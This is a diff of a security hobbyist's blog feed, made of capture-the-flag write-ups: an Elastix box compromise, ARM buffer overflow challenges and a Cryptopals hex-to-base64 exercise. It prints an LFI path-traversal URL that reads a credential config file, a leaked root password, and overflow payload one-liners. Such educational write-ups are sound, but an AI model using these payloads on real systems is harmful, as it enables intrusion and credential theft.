     </figure>
 
 </p>
-<p>No luck, and from the error it sounds like it's a dead end until we have a shell.</p>
+<p>No luck, and from the error it sounds like it&rsquo;s a dead end until we have a shell.</p>
 <hr>
 <h1 id="checking-out-webmin">Checking out Webmin</h1>
-<p>There's a server running on port 10000 which nmap identified as Webmin. Sure enough navigating there brought me to a login page. I decided to try several default logins, and after a bit, well&hellip;
+<p>There&rsquo;s a server running on port 10000 which nmap identified as Webmin. Sure enough navigating there brought me to a login page. I decided to try several default logins, and after a bit, well&hellip;
 
     <figure class="left" >
         <img src="2019-10-13-21-06-43.webp"   />
@@ -752,7 +752,7 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 </p>
-<p>Maybe there's an exploit for it we can use. We have the version number from nmap: MiniServ 1.570</p>
+<p>Maybe there&rsquo;s an exploit for it we can use. We have the version number from nmap: MiniServ 1.570</p>
 
     <figure class="left" >
         <img src="2019-10-13-21-09-16.webp"   />
@@ -763,10 +763,10 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 
-<p>There's a couple, namely the RCE ones, but the one that doesn't require user auth isn't for our version unfortunately. Onward to explore other services!</p>
+<p>There&rsquo;s a couple, namely the RCE ones, but the one that doesn&rsquo;t require user auth isn&rsquo;t for our version unfortunately. Onward to explore other services!</p>
 <hr>
 <h1 id="hylafax-what-are-you-hiding">Hylafax, what are you hiding?</h1>
-<p>Hylafax sounds interesting, let's do some digging with searchsploit:
+<p>Hylafax sounds interesting, let&rsquo;s do some digging with searchsploit:
 
     <figure class="left" >
         <img src="2019-10-13-21-21-09.webp"   />
@@ -777,7 +777,7 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 </p>
-<p>Damn, nothing for version 4.3.1, ah well that's the breaks. Time to keep searching.</p>
+<p>Damn, nothing for version 4.3.1, ah well that&rsquo;s the breaks. Time to keep searching.</p>
 <hr>
 <h1 id="back-to-elastix">Back to Elastix</h1>
 <p>I realized I had not looked at any elastix exploits yet, time to rectify that.</p>
@@ -789,7 +789,7 @@ nmap -sC -sV -p$ports $1
     </figure>
 
 
-<p>The Blind SQL Injection, and PHP Code Injection both look pretty interesting. Long story short, I couldn't get them to work.
+<p>The Blind SQL Injection, and PHP Code Injection both look pretty interesting. Long story short, I couldn&rsquo;t get them to work.
 After a lot of messing around I decided to go back to the list and try the next one, which was an LFI exploit.</p>
 <p>Checking out the exploit we can see it just crafts a URL:
 <code>/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</code></p>
@@ -806,7 +806,7 @@ After a lot of messing around I decided to go back to the list and try the next 
 </p>
 <p>Paydirt&hellip; We have a local config file, and from the look of it a lot of passwords.</p>
 <h1 id="getting-user-and-root">Getting User and Root</h1>
-<p>I noticed the config file mentioned FreePBX, part of an RCE exploit. I tried to get this to work but it wouldn't, I suspect perl isn't available on the remote system.</p>
+<p>I noticed the config file mentioned FreePBX, part of an RCE exploit. I tried to get this to work but it wouldn&rsquo;t, I suspect perl isn&rsquo;t available on the remote system.</p>
 <p>I went back to the config and started looking for credentials to use. I noticed <code>jEhdIekWmdjE</code> was repeating a lot and decided to see if the box reused passwords for the root ssh login. Sure enough <code>jEhdIekWmdjE</code> unlocked it.</p>
 
     <figure class="left" >
@@ -830,13 +830,13 @@ After a lot of messing around I decided to go back to the list and try the next 
             
             <guid>/posts/buffer-overflow-on-arm-part-2/</guid>
             <description>Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.
-What&#39;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there.</description>
+What&amp;rsquo;s the return address? The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there.</description>
             <content type="html"><![CDATA[<p>Hello again faithful readers! Today we are going to explore another buffer overflow on an ARM binary. The previous challenge involved overwriting a variable. This one is going to overflow the return address instead.</p>
-<h2 id="whats-the-return-address">What's the return address?</h2>
+<h2 id="whats-the-return-address">What&rsquo;s the return address?</h2>
 <p>The return address is a value stored on the stack whenever a function is called. After the function finishes, the CPU will load the value of the return address and attempt to execute the data there. This means if we can overflow the return address we can get the CPU to jump to any memory address.</p>
 <hr>
 <h1 id="exploring-the-challenge">Exploring the Challenge</h1>
-<p>Here's the source code for this challenge:</p>
+<p>Here&rsquo;s the source code for this challenge:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&#34;flag.h&#34;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
@@ -872,12 +872,12 @@ What&#39;s the return address? The return address is a value stored on the stack
 </ol>
 <p>This all means we can overflow the memory, into the return address, and point the execution to whatever address we like.</p>
 <h2 id="finding-the-right-address">Finding the Right Address</h2>
-<p>To find the right address we are going to take a look at the assembly of the binary. There's a lovely tool in Linux called <code>objdump</code> that will output the assembly if given the <code>-d</code> tag.</p>
+<p>To find the right address we are going to take a look at the assembly of the binary. There&rsquo;s a lovely tool in Linux called <code>objdump</code> that will output the assembly if given the <code>-d</code> tag.</p>
 <p>Now, when I tried a standard <code>objdump -d</code> the program complained about the architecture being unknown. After a quick search I tried <code>objdump -d -m arm</code>, but it complained about not being able to do that.</p>
 <p>Another, somewhat longer search, eventually led to the solution:</p>
 <p><code>apt install gcc-arm-none-eabi</code></p>
 <p><code>arm-none-eabi-objdump -d a.outl</code></p>
-<p>That apt package installed an arm specifc objdump, and from that I was able to get the assembly. It outputs quite a lot that's not relevant to our current interests, so I ran it again and piped it into a grep statement:</p>
+<p>That apt package installed an arm specifc objdump, and from that I was able to get the assembly. It outputs quite a lot that&rsquo;s not relevant to our current interests, so I ran it again and piped it into a grep statement:</p>
 <p><code>arm-none-eabi-objdump -d a.out | grep win</code></p>
 
     <figure class="left" >
@@ -889,11 +889,11 @@ What&#39;s the return address? The return address is a value stored on the stack
     </figure>
 
 
-<p>There's our address: <code>000104b0</code></p>
+<p>There&rsquo;s our address: <code>000104b0</code></p>
 <p>If we overwrite the return address with that value, it should continue through the <code>win()</code> function which will print our flag.</p>
 <h1 id="crafting-the-payload">Crafting the Payload</h1>
 <p>We have 128 bytes to enter before we being to overflow. After that we begin to overflow into memory used for other purposes. Last time it was used for another variable, but this time there is no such variable declared so we end up overflowing into the metadata of the stack.</p>
-<p>When a function is called in ARM assembly, the function creates a &ldquo;stack frame&rdquo;. There's a lot of that can be said about this concept, but we can get some help using this image from Azeria Labs:</p>
+<p>When a function is called in ARM assembly, the function creates a &ldquo;stack frame&rdquo;. There&rsquo;s a lot of that can be said about this concept, but we can get some help using this image from Azeria Labs:</p>
 
     <figure class="left" >
         <img src="stack.webp"   />
@@ -904,10 +904,10 @@ What&#39;s the return address? The return address is a value stored on the stack
     </figure>
 
 
-<p>From the image we can see the local variables are stored immediately before the frame pointer (FP), and link register (LR). These are both 4 byte memory addresses stored on the stack. The link register is also known as the return address, so that's the value we want to overwrite with <code>000104b0</code> to jump to the <code>win()</code> function.</p>
+<p>From the image we can see the local variables are stored immediately before the frame pointer (FP), and link register (LR). These are both 4 byte memory addresses stored on the stack. The link register is also known as the return address, so that&rsquo;s the value we want to overwrite with <code>000104b0</code> to jump to the <code>win()</code> function.</p>
 <p>To do so we fill up our local variable with 128 bytes + 4 bytes to overwrite the frame pointer (this can be whatever we want), and finally 4 more to overwrite the link register, AKA return address.</p>
-<h2 id="theres-one-catch-though">There's one catch though&hellip;</h2>
-<p>We have to write the memory address backwards, one byte at a time. This is because the binary we are exploiting was compiled for ARM in Little Endian mode. There's a lot that can be said about that, but suffice to say for this post we need to simply be aware of this fact and adjust our payload properly.</p>
+<h2 id="theres-one-catch-though">There&rsquo;s one catch though&hellip;</h2>
+<p>We have to write the memory address backwards, one byte at a time. This is because the binary we are exploiting was compiled for ARM in Little Endian mode. There&rsquo;s a lot that can be said about that, but suffice to say for this post we need to simply be aware of this fact and adjust our payload properly.</p>
 <p>So <code>00 01 04 b0</code> becomes <code>b0 04 01 00</code>. Our final payload becomes</p>
 <p><code>128 bytes of anything for buffer</code> + <code>4 bytes of anything to overwrite frame pointer</code> + <code>address we want to jump to</code></p>
 <p>We can use python to pipe the payload into netcat like so:</p>
@@ -922,8 +922,8 @@ What&#39;s the return address? The return address is a value stored on the stack
     </figure>
 
 
-<h1 id="bingo-theres-our-flag">Bingo, there's our flag.</h1>
-<p>You might have noticed it shows the failure message first. That's because the overflow doesn't affect anything until the function completes, and the return popped off the stack so execution can jump to it.</p>
+<h1 id="bingo-theres-our-flag">Bingo, there&rsquo;s our flag.</h1>
+<p>You might have noticed it shows the failure message first. That&rsquo;s because the overflow doesn&rsquo;t affect anything until the function completes, and the return popped off the stack so execution can jump to it.</p>
 ]]></content>
         </item>
         
@@ -933,12 +933,12 @@ What&#39;s the return address? The return address is a value stored on the stack
             <pubDate>Mon, 02 Sep 2019 23:34:59 +0000</pubDate>
             
             <guid>/posts/arm-ctf-sending-bytes/</guid>
-            <description>Why hello there faithful reader! It&#39;s time again for another hacking related post.
-Today we&#39;ll be continuing on from our last post where we executed a buffer overflow to overwrite a secret number to reveal a flag.
+            <description>Why hello there faithful reader! It&amp;rsquo;s time again for another hacking related post.
+Today we&amp;rsquo;ll be continuing on from our last post where we executed a buffer overflow to overwrite a secret number to reveal a flag.
 So, a quick recap:
  We have a buffer overflow for a service which accepts our input. We can send it anything we want, if we have some way to represent non-printable characters. We need to send it 129 bytes, with the first being 0x0 and the last being \n The program lives on a remote server that we can connect via an IPv4 address.</description>
-            <content type="html"><![CDATA[<p>Why hello there faithful reader! It's time again for another hacking related post.</p>
-<p>Today we'll be continuing on from our <a href="https://foresthex.com/buffer-overflow-on-arm/">last post</a> where we executed a buffer overflow to overwrite a secret number to reveal a flag.</p>
+            <content type="html"><![CDATA[<p>Why hello there faithful reader! It&rsquo;s time again for another hacking related post.</p>
+<p>Today we&rsquo;ll be continuing on from our <a href="https://foresthex.com/buffer-overflow-on-arm/">last post</a> where we executed a buffer overflow to overwrite a secret number to reveal a flag.</p>
 <p>So, a quick recap:</p>
 <ol>
 <li>We have a buffer overflow for a service which accepts our input.</li>
@@ -947,8 +947,8 @@ So, a quick recap:
 <li>The program lives on a remote server that we can connect via an IPv4 address.</li>
 </ol>
 <h2 id="how-to-connect">How to connect?</h2>
-<p>Well, there's more than one way to skin a cat, and the quickest way to get an interface is using a program called <code>netcat</code>.</p>
-<p>Netcat is pretty old, but it's reliable, and included on almost every linux distribution, which means we can usually rely on it for quick testing. Let's connect and see what's what.</p>
+<p>Well, there&rsquo;s more than one way to skin a cat, and the quickest way to get an interface is using a program called <code>netcat</code>.</p>
+<p>Netcat is pretty old, but it&rsquo;s reliable, and included on almost every linux distribution, which means we can usually rely on it for quick testing. Let&rsquo;s connect and see what&rsquo;s what.</p>
 <p><code>nc localhost 9001</code></p>
 
     <figure class="left" >
@@ -961,18 +961,18 @@ So, a quick recap:
 
 
 <p>Netcat connects to the remote server, and displays the message asking for the secret. It then waits for input, terminated by <code>\n</code>, which is automatically sent by netcat when we press enter.</p>
-<p>After that the remote program compares the secret (which is randomly generated every time it's run) to our input. If it doesn't match it sends a failure message and closes the connection.</p>
-<h3 id="theres-a-slight-problem-though">There's a slight problem though&hellip;</h3>
-<p>We can't send null bytes over the netcat interactive interface because it's a non-printable character. If we send <code>0</code>, or <code>0x0</code>, it will send <code>\x30</code> or <code>\x30\x78\x30</code> respectively.</p>
-<p>The reason is, the socket doesn't send the actual characters, instead it sends a byte of data in binary which represents the character. One byte is represented by two hexadecimal characters, and you can look up the hexadecimal representation of each character on an <a href="http://www.asciitable.com/">ascii table</a>.</p>
-<p>So the netcat interface will convert any character we enter into it's raw binary form, chosen off the ascii table. That's why <code>0x0</code> will send the byte values for each one of those characters.</p>
+<p>After that the remote program compares the secret (which is randomly generated every time it&rsquo;s run) to our input. If it doesn&rsquo;t match it sends a failure message and closes the connection.</p>
+<h3 id="theres-a-slight-problem-though">There&rsquo;s a slight problem though&hellip;</h3>
+<p>We can&rsquo;t send null bytes over the netcat interactive interface because it&rsquo;s a non-printable character. If we send <code>0</code>, or <code>0x0</code>, it will send <code>\x30</code> or <code>\x30\x78\x30</code> respectively.</p>
+<p>The reason is, the socket doesn&rsquo;t send the actual characters, instead it sends a byte of data in binary which represents the character. One byte is represented by two hexadecimal characters, and you can look up the hexadecimal representation of each character on an <a href="http://www.asciitable.com/">ascii table</a>.</p>
+<p>So the netcat interface will convert any character we enter into it&rsquo;s raw binary form, chosen off the ascii table. That&rsquo;s why <code>0x0</code> will send the byte values for each one of those characters.</p>
 <h1 id="getting-around-this-issue">Getting around this issue</h1>
-<p>Theres several different ways to accomplish sending non-printable characters to a socket. I'll cover 2 that are achievable in the command line.</p>
+<p>Theres several different ways to accomplish sending non-printable characters to a socket. I&rsquo;ll cover 2 that are achievable in the command line.</p>
 <h2 id="method-one---echo--e">Method One - echo -e</h2>
 <p>This is the most portable version since <code>echo -e</code> will be available on all but extremely locked down/customzed linux distributions.</p>
 <p>The syntax is very simple:</p>
 <p><code>echo -e &quot;\x30\n&quot; | nc localhost 9001</code></p>
-<p>The big problem with it, we have to manually put 128 <code>\x00</code>'s in the command. That's messy, but doable. Using python I can print the string I need like so:</p>
+<p>The big problem with it, we have to manually put 128 <code>\x00</code>'s in the command. That&rsquo;s messy, but doable. Using python I can print the string I need like so:</p>
 <p><code>print(b'\x00'*128 + b'\n')</code></p>
 
     <figure class="left" >
@@ -998,10 +998,10 @@ So, a quick recap:
 
 <p>There it is, blanked out of course. No free flags here!</p>
 <h2 id="method-2---command-line-python">Method 2 - Command Line Python</h2>
-<p>So the first method works, but it's annoying to have to generate those characters and paste them. There could be a more efficient way to do it just using bash, but I usually just stick with Python since I'm extremely comfortable with it.</p>
+<p>So the first method works, but it&rsquo;s annoying to have to generate those characters and paste them. There could be a more efficient way to do it just using bash, but I usually just stick with Python since I&rsquo;m extremely comfortable with it.</p>
 <p>Python can achieve what we need using this syntax:</p>
 <p><code>python -c 'print(&quot;\x00&quot;*128 + &quot;\n&quot;)' | nc localhost 9001</code></p>
-<p>That's a lot easier to type, and a lot nicer looking. We can invoke python with the <code>-c</code> flag to execute the statment in quotes immediately, and display the output to STDOUT. Then it's piped into netcat using <code>|</code>.</p>
+<p>That&rsquo;s a lot easier to type, and a lot nicer looking. We can invoke python with the <code>-c</code> flag to execute the statment in quotes immediately, and display the output to STDOUT. Then it&rsquo;s piped into netcat using <code>|</code>.</p>
 
     <figure class="left" >
         <img src="image-4.png"   />
@@ -1012,7 +1012,7 @@ So, a quick recap:
     </figure>
 
 
-<p>There's the lovely flag again, with a lot less of a headache getting the command right.</p>
+<p>There&rsquo;s the lovely flag again, with a lot less of a headache getting the command right.</p>
 <p>This concludes the two part post for the ARM buffer overflow challenge. Stay tuned for a post on the next one!</p>
 ]]></content>
         </item>
@@ -1023,12 +1023,12 @@ So, a quick recap:
             <pubDate>Fri, 30 Aug 2019 20:27:30 +0000</pubDate>
             
             <guid>/posts/buffer-overflow-on-arm-part-1/</guid>
-            <description>Hello again faithful readers! Today&#39;s post is about exploiting a buffer overflow.
-A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That&#39;s okay though, it&#39;s how you learn.
+            <description>Hello again faithful readers! Today&amp;rsquo;s post is about exploiting a buffer overflow.
+A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That&amp;rsquo;s okay though, it&amp;rsquo;s how you learn.
 I was happy to see the source code provided, and even happier when I was able to quickly identify the path to success without needing a debugger at all.</description>
-            <content type="html"><![CDATA[<p>Hello again faithful readers! Today's post is about exploiting a buffer overflow.</p>
-<p>A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That's okay though, it's how you learn.</p>
-<p>I was happy to see the source code provided, and even happier when I was able to quickly identify the path to success without needing a debugger at all. Here's the code:</p>
+            <content type="html"><![CDATA[<p>Hello again faithful readers! Today&rsquo;s post is about exploiting a buffer overflow.</p>
+<p>A few days ago I was invited to attempt some binary exploitation challenges for ARM architecture. Of course I agreed, despite the fact that I have no experience debugging ARM binaries. That&rsquo;s okay though, it&rsquo;s how you learn.</p>
+<p>I was happy to see the source code provided, and even happier when I was able to quickly identify the path to success without needing a debugger at all. Here&rsquo;s the code:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#f92672">*</span>argv)
 {
         <span style="color:#66d9ef">struct</span> {
@@ -1056,7 +1056,7 @@ I was happy to see the source code provided, and even happier when I was able to
                 printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Failed!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;);
         }
 }
-</code></pre></div><p>I've commented the code explaining what each piece does. Keep in mind, when numbers are defined using <code>0xn</code> notation it means they are hexadecimal numbers, so <code>0x80</code> is <code>128</code> bytes.</p>
+</code></pre></div><p>I&rsquo;ve commented the code explaining what each piece does. Keep in mind, when numbers are defined using <code>0xn</code> notation it means they are hexadecimal numbers, so <code>0x80</code> is <code>128</code> bytes.</p>
 <p>The vulnerability exists because of the function <code>gets()</code>, which has since been removed from glibc. You can read about it here: <a href="https://linux.die.net/man/3/fgets">https://linux.die.net/man/3/fgets</a></p>
 <pre><code class="language-root" data-lang="root">gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF,
 which it replaces with a null byte ('\0').
@@ -1069,7 +1069,7 @@ No check for buffer overrun is performed (see BUGS below).
 <blockquote>
 <p>The strcmp() function compares the two strings s1 and s2.  It returns an integer less than, equal to, or greater than zero if s1 is found, respectively, to be less than, to match, or be greater than s2.</p>
 </blockquote>
-<p>That didn't really make sense to me, so I found the source code for the function to see what's going on. Here it is:</p>
+<p>That didn&rsquo;t really make sense to me, so I found the source code for the function to see what&rsquo;s going on. Here it is:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">STRCMP (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p1, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p2) <span style="color:#75715e">// p1 and p2 are memory addresses
 </span><span style="color:#75715e"></span>{
   <span style="color:#75715e">//saves both addresses in new memory location
@@ -1094,18 +1094,18 @@ No check for buffer overrun is performed (see BUGS below).
   <span style="color:#75715e">//If it ever doesnt match, end up here.
 </span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> c1 <span style="color:#f92672">-</span> c2;
 }
-</code></pre></div><p>I added comments to the code, but basically it iterates through both strings one character at a time until it hits a null byte (0) in the first string, or a character which doesn't match. It then returns the value of the last characters compared, subtracted from each other, which will always be 0 if it's a match.</p>
-<p>So the takeaway here is, <code>gets()</code> won't stop at null bytes, but <code>strcmp()</code> will. Because of this, we can happily pass null bytes to the input, and still execute an overflow into <code>local_vars.secret</code></p>
+</code></pre></div><p>I added comments to the code, but basically it iterates through both strings one character at a time until it hits a null byte (0) in the first string, or a character which doesn&rsquo;t match. It then returns the value of the last characters compared, subtracted from each other, which will always be 0 if it&rsquo;s a match.</p>
+<p>So the takeaway here is, <code>gets()</code> won&rsquo;t stop at null bytes, but <code>strcmp()</code> will. Because of this, we can happily pass null bytes to the input, and still execute an overflow into <code>local_vars.secret</code></p>
 <hr>
 <h1 id="crafting-the-payload-the-magic-part">Crafting the payload (the magic part)</h1>
 <p>Knowing this we can craft a payload that will overwrite <code>local_vars.secret</code> with whatever value we want, and can set our <code>local_vars.buffer</code> to the same string using null bytes to terminate it for <code>strcmp()</code>. On top of that, we can abuse the fact the <code>gets()</code> will happily save as many null bytes as we want, which means we can make both our input, and the secret, immediately terminate by setting the first byte value to 0. It will work like this:</p>
 <p><code>0</code> + <code>127 bytes of whatever we want</code> + <code>\n (for newline)</code></p>
-<p>That's 129 bytes of data, for the 128 byte buffer. Let's step through the logic and see why this works.</p>
+<p>That&rsquo;s 129 bytes of data, for the 128 byte buffer. Let&rsquo;s step through the logic and see why this works.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">0x80</span>]; <span style="color:#75715e">//Reserves 0x80 (128) bytes in memory.
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> secret[<span style="color:#ae81ff">0x10</span>]; <span style="color:#75715e">//Reserves 0x10 (16) bytes in memory.
 </span></code></pre></div><p>This code reserves <code>128 bytes</code> in memory for our buffer, and 16 bytes for our secret. This is a continuous block of memory, so immediately after the 128 bytes for the buffer are the 16 bytes for the secret.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">gets(local_vars.buffer); <span style="color:#75715e">//Saves input from STDIN in memory allocated for local_vars.buffer
-</span></code></pre></div><p>This accepts our input, which is <code>0</code> + <code>127 bytes of whatever</code> + <code>\n</code>, and stores it in memory starting at the address reserved for our buffer. Once it hits the <code>\n</code> value, it will know to stop copying. On top of that, it replaces the <code>\n</code> with <code>0</code>, this is simply how the function works. That's not something I knew off hand, I had to research the <code>gets()</code> function.</p>
+</span></code></pre></div><p>This accepts our input, which is <code>0</code> + <code>127 bytes of whatever</code> + <code>\n</code>, and stores it in memory starting at the address reserved for our buffer. Once it hits the <code>\n</code> value, it will know to stop copying. On top of that, it replaces the <code>\n</code> with <code>0</code>, this is simply how the function works. That&rsquo;s not something I knew off hand, I had to research the <code>gets()</code> function.</p>
 <p>Since the memory allocated for the secret is immediately after the first byte of the secret is now <code>0</code> since <code>gets()</code> replaced <code>\n</code> with it.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>strcmp(local_vars.buffer,local_vars.secret))
 </code></pre></div><p>This conditional statement checks if the value returned by <code>strcmp()</code> is 0. We must again refer to documentation, or in this case the source code, to understand what the function is doing.</p>
@@ -1117,7 +1117,7 @@ No check for buffer overrun is performed (see BUGS below).
 <p>Well, <code>0-0 = 0</code>, so it returns 0, which means the statement <code>if(!strcmp(local_vars.buffer,local_vars.secret))</code> evaluates to true, and execution continues to this line:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp">printf(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Congratulations, here&#39;s your flag %s</span><span style="color:#e6db74">&#34;</span>, FLAG);
 </code></pre></div><p>Now getting these values to the actual program is kind of tricky. <a href="https://foresthex.com/buffer-overflow-on-arm-part-2/">I made a post that goes into more detail about how to do this.</a></p>
-<p>I'm not going to leave you hanging though, the following python statement will send raw binary, represented by <code>\xNN</code> where N is a hexadecimal digit, to netcat:</p>
+<p>I&rsquo;m not going to leave you hanging though, the following python statement will send raw binary, represented by <code>\xNN</code> where N is a hexadecimal digit, to netcat:</p>
 <p><code>python -c 'print(&quot;\x00&quot;*128 + &quot;\n&quot;)' | nc localhost 9001</code></p>
 
     <figure class="left" >
@@ -1129,6 +1129,51 @@ No check for buffer overrun is performed (see BUGS below).
     </figure>
 
 
+]]></content>
+        </item>
+        
+        <item>
+            <title>Cryptopals Set 1 - Challenge 1</title>
+            <link>/posts/cryptopals-set-1-challenge-1/</link>
+            <pubDate>Tue, 11 Jun 2019 21:14:35 +0000</pubDate>
+            
+            <guid>/posts/cryptopals-set-1-challenge-1/</guid>
+            <description>Welcome to another Forest Hex crypto adventure! 🌲🏹 Today I will be walking through the first Cryptopals challenge.
+Cryptopals is a series of cryptology related challenges broken into sets, escalating in difficulty. I was recommended to check out this site by another user in a Nintendo Switch Hacking discord server.You can find this server here: https://discord.gg/ZdqEhed
+In fact, a lot of my recent drive to learn hacking was watching the Nintendo Switch hacking scene unfold.</description>
+            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-crypto-adventure-">Welcome to another Forest Hex crypto adventure! 🌲🏹</h3>
+<p><em>Today I will be walking through the first Cryptopals challenge.</em></p>
+<p>Cryptopals is a series of cryptology related challenges broken into sets, escalating in difficulty. I was recommended to check out this site by another user in a Nintendo Switch Hacking discord server.You can find this server here: <a href="https://discord.gg/ZdqEhed">https://discord.gg/ZdqEhed</a></p>
+<p>In fact, a lot of my recent drive to learn hacking was watching the Nintendo Switch hacking scene unfold. It was extremely interesting to see the breadth, and depth of knowledge that came together.</p>
+<p>Anyway, on to the first challenge. Here is the description on the site:</p>
+<p><a href="https://cryptopals.com/sets/1/challenges/1">https://cryptopals.com/sets/1/challenges/1</a></p>
+<pre><code>Convert hex to base64
+The string: 49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d
+Should produce: SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t
+So go ahead and make that happen. You'll need to use this code for the rest of the exercises.
+Cryptopals Rule
+Always operate on raw bytes, never on encoded strings. Only use hex and base64 for pretty-printing.
+</code></pre><hr>
+<p>This is a simple conversion of hex to base64. This is easily achievable with Python.</p>
+<p>Something that may be easily missed: <code>Always operate on raw bytes, never on encoded strings. Only use hex and base64 for pretty-printing. </code></p>
+<p>In order to achieve this:</p>
+<ol>
+<li>Input = Hex String</li>
+<li>Convert input to bytes.</li>
+<li>Convert bytes to base 64.</li>
+<li>Print result.</li>
+</ol>
+<p>Python includes a handy way to convert a hex string to bytes: <code>bytes.fromhex()</code>
+It also has a standard library <code>base64</code> which includes <code>base64.b64encode()</code>
+So we simply call these functions in the right order and print the result.</p>
+<p>Here is the code that achieves this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex_to_b64</span>(input):
+    <span style="color:#66d9ef">return</span> base64<span style="color:#f92672">.</span>b64encode(bytes<span style="color:#f92672">.</span>fromhex(input))
+<span style="color:#66d9ef">print</span>(hex_to_b64(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">49276d206b696c6c696e6720796f757220627261696e206c696b65206120706f69736f6e6f7573206d757368726f6f6d</span><span style="color:#e6db74">&#39;</span>))
+</code></pre></div><p>Our function properly prints</p>
+<p><code>b'SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t'</code></p>
+<p>The <code>b</code> in front of the string means it&rsquo;s a bytes type instead of a string.</p>
 ]]></content>
         </item>
         
